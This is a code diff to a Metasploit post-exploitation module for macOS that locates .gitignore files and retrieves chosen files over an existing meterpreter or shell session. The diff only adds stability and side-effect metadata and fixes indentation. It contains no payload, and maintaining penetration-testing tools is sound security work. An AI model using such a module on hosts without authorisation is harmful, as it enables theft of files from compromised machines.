@@ -11,9 +11,14 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'N!ght Jmp'],
         'Platform' => [ 'osx' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
- )
+    )
     register_options([
       OptString.new('MODE', [false, 'Gitignore retrieval modes: 1). Find gitignore file locations. 2). Retrieve specific gitignore/file contents', '']),
       OptString.new('FILE', [false, 'Filepath of gitignore/file to retrieve (For mode 2)', ''])
